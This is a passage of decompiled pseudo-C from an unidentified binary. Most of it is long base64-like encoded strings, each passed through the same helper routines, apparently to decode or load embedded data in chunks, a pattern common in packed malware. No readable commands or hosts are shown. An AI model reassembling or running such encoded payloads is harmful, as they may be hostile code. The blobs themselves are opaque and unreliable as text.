ImlKd39Una31Z9jG4aeK+aw/T3T7ktj/7LNV8Zz4Ts6F3gLSSbjtyUUJgzanaQkwojJvNM1tZqyw2qshX3imb1lxiJ09epnkF+MdeH1foZA0zA1aq3cTJq0papjJwa7ss9EBx+sc7kJg/BEyMlTQoWehwKcfIT5mP+NyJh4xoaqyZNI5Y7n/Ze3xF/QShCRLFZ2kVhc8kjnQCcQ8jat7eNvVCbByJaTjJndXdcbQEkxBHqHdCcQaLrgWZZKhcSLhympR2+P9oKtyctiSILX1tSQSw0IIZaq4nJdFHPwaAYxs4j+4sJ+ZNDSZUMx89TJ3jwbn1+cKZqs1BXhPid7TRpu3JDeHDPRsdph/NBrrRUqj0Its2DJnxvvU8JR65DD0IfD34YV+Y4np2Of4aJfAMZxHFL4vTP0+9ylMzGGTdEVBsFutQWRZH8oySzBUAOj0czfN/mi+li2Grkg1MlTYgBk8dqL6McV0TDmKErNiWeQq6m10rKdvu7v76l7GebT9NMp2PHdxQ2Cd7bgjWB3SPeI7A31GSkMIdML9LB76mS4ZskrsDGCKfoA1qbOzy8V50dl5kIgUEc1UgxDuRXAk1UH+woGHyDnlxKGc/yPdFRd/3jApgP8DFkXr02vBtVNCxlsk4ajlmyqhVXLBMStEA3DrfWmvC+fY9s7b1MPMz6QEpVCD7abXfvVp+vjhZuD5OH1TTQLbQvxXQeMyJns3x7xf3yNa4s/tL5z4DhyR1/Jmk/d\"\n    ;\n    puStack580 = &stack0xfffffdf8;\n    uStack584 = 0x401a73;\n    puStack580 = fcn.004028d0();\n    uStack464 = CONCAT31(uStack464._1_3_, 0x1d);\n    pcStack572 = *0x4295b4;\n    uStack576 = NULL;\n    uStack584 = 0x401a8d;\n    fcn.004022b0();\n    uStack584 = 1;\n    pcStack476 = pcStack476 & 0xffffff00;\n    pcStack588 = 0x401a9c;\n    fcn.004024b0();\n    uStack592 = &stack0xfffffdd8;\n    pcStack588 = \n    \"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\"\n    ;\n    puStack596 = &stack0xfffffde8;\n    uStack600 = 0x401ab0;\n    puStack596 = fcn.004028d0();\n    uStack480 = CONCAT31(uStack480._1_3_, 0x1e);\n    pcStack588 = *0x4295b4;\n    uStack592 = NULL;\n    uStack600 = 0x401aca;\n    fcn.004022b0();\n    uStack600 = 1;\n    pcStack492 = pcStack492 & 0xffffff00;\n    pcStack604 = 0x401ad9;\n    fcn.004024b0();\n    uStack608 = &stack0xfffffdc8;\n    pcStack604 = \n    \"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\"\n    ;\n    puStack612 = &stack0xfffffdd8;\n    uStack616 = 0x401aed;\n    puStack612 = fcn.004028d0();\n    uStack496 = CONCAT31(uStack496._1_3_, 0x1f);\n    pcStack604 = *0x4295b4;\n    uStack608 = NULL;\n    uStack616 = 0x401b07;\n    fcn.004022b0();\n    uStack616 = 1;\n    pcStack508 = pcStack508 & 0xffffff00;\n    pcStack620 = 0x401b16;\n    fcn.004024b0();\n    uStack624 = &stack0xfffffdb8;\n    pcStack620 = \n    \"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\"\n    ;\n    puStack628 = &stack0xfffffdc8;\n    uStack632 = 0x401b2a;\n    puStack628 = fcn.004028d0();\n    uStack512 = CONCAT31(uStack512._1_3_, 0x20);\n    pcStack620 = *0x4295b4;\n    uStack624 = NULL;\n    uStack632 = 0x401b44;\n    fcn.004022b0();\n    uStack632 = 1;\n    pcStack524 = pcStack524 & 0xffffff00;\n    pcStack636 = 0x401b53;\n    fcn.004024b0();\n    uStack640 = &stack0xfffffda8;\n    pcStack636 = \n    \"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\"\n    ;\n    puStack644 = &stack0xfffffdb8;\n    uStack648 = 0x401b67;\n    puStack644 = fcn.004028d0();\n    uStack528 = CONCAT31(uStack528._1_3_, 0x21);\n    pcStack636 = *0x4295b4;\n    uStack640 = NULL;\n    uStack648 = 0x401b81;\n    fcn.004022b0();\n    pcStack540 = pcStack540 & 0xffffff00;\n    uStack648 = 1;\n    pcStack652 = 0x401b90;\n    fcn.004024b0();\n    uStack656 = &stack0xfffffd98;\n    pcStack652 = \n    \"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\"\n    ;\n    puStack660 = &stack0xfffffda8;\n    uStack664 = 0x401ba4;\n    puStack660 = fcn.004028d0();\n    uStack544 = CONCAT31(uStack544._1_3_, 0x22);\n    pcStack652 = *0x4295b4;\n    uStack656 = NULL;\n    uStack664 = 0x401bbe;\n    fcn.004022b0();\n    uStack664 = 1;\n    pcStack556 = pcStack556 & 0xffffff00;\n    pcStack668 = 0x401bcd;\n    fcn.004024b0();\n    uStack672 = &stack0xfffffd88;\n    pcStack668 = \n    \"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\"\n    ;\n    puStack676 = &stack0xfffffd98;\n    uStack680 = 0x401be1;\n    puStack676 = fcn.004028d0();\n    uStack560 = CONCAT31(uStack560._1_3_, 0x23);\n    pcStack668 = *0x4295b4;\n    uStack672 = NULL;\n    uStack680 = 0x401bfb;\n    fcn.004022b0();\n    uStack680 = 1;\n    pcStack572 = pcStack572 & 0xffffff00;\n    pcStack684 = 0x401c0a;\n    fcn.004024b0();\n    uStack688 = &stack0xfffffd78;\n    pcStack684 = \n    \"clokxGrmAyfZgPuimlAu/bfeQu/I8+jO5yOqA3txWsv1DAf8Wv7gRt11kcvVZI5WSzKTKqpiVuNVATJHfzEIhES4rALGsR8W3jp0gZr2/1WspxoboJ1jD6UdRzg2CdljNx4PtnULVbOlb3zYyzmqzd5g2Hw316SfM8lQSBzGnIjqaWZkFMXxxZDeye4h30eGmnHQnSIisTvFTt4xRl+lQojXu522beyLbtw47faJ4XZHOujbdguFSGG9xAJyZ9h3RETV4LUmZ3wkIRXlgLhReCWnoTGebEDbSSwnqpBX9cnAhFXpr5m2JUf8NLvlF2uTIqJBUAz5Jl8jUYh2BuLULiGbhLGk4pfTq7R67Oz6SHeFZaxhP3pqq05UF5kYHgV0N5Ncluc5Z0ZkDhGDjSaMLmBshS42O1zd/ED5J5T++wjI1StriG06t/04QkSvnzdhz5rYQLtPZEvGOSKwT5uUBYxH+SHl+UN6M5SDbmPGDwGeEDV6dNqxM8f2XV4yHKwaUT3SVxCX+J6HzSsdltqbxoGAEcS2RVuBgTF0n6pHjXmRgVbTf1g581wTe7MbAh8jJw0TEyE00hVjVsHLo8g7dQGkQIGrkm2faH9FEX3IANkG+4acuis+YgE7vjPLwjOi3aGW7xDGgRFKuxPDnUWWLkHK81P5cScrqICfXhJtS0zluN5DQjFd21KeHDVHrbMHLvfbVBQ9anaElmPwwep9z8K7IsFKaK9aqky32wjQR8aW4vEgxKuoLY77BU9JLOqOJk8ifxYTA+kIbfI6ct8VAL+230NWPn4wTbYKsQY6gsVicVMnh8Npe6UhyOicUoib21Leiv9HZ88HnoZ2bnETOnH09HKJdZrJQKMG8/P6HOZfh9IURmgn0lL//OdvhaeAC0xn4oRR3q+Bjfw75zj2KdyfhQSa2uG4g+pvZgM2bDDgI7eFfHRTKlXwJb2+MeE82v3e3ctFmv1dXk7sEyEPqomBqi/S001Jv3bdH7/rTEvw8YCsWfK6r9G16YLkfvKE6rzwjC+S8mZ94QG6scMugnt/KiTf+MXiWR1ssHFITEQLHrG5QeISCwHmgDvICm9EMsX7O8SpXEd5UDbTFw38Gkd6womMtMYe+sF+7RrYQWEQMmaIrfqy5yFngFyC3sj2BlO/7/AR4ADneCYuKyFHiGtT0ZH01Ysyn/5KGcG1ZEwvACCP7lPWMhtH5wCBfHxsWHeCKIa9uhHk7BCz4hO8E/lC07y7C